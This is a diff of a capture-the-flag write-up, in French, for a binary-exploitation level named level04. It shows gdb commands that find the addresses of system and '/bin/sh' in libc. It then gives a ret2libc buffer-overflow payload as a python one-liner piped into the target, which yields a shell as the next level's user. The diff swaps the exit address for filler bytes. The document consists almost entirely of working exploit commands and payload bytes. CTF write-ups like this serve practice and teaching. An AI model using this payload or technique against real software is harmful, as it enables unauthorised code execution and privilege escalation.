@@ -5,15 +5,10 @@ On récupère l'adresse de system, exit et /bin/sh
 (gdb) info function system
 -> 0xf7e6aed0
 
-(gdb) info function exit
--> 0xf7e5eb70
-
-(gdb) info proc map
-(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
-(gdb) x/s 0xf7f897ec
+(gdb) find &system,+9999999,"/bin/sh"
 -> 0xf7f897ec
 
-python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/crack && cat /tmp/crack - | ./level04
+python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"AAAA"+"\xec\x97\xf8\xf7"' > /tmp/crack && cat /tmp/crack - | ./level04
 Give me some shellcode, k
 whoami
 level05
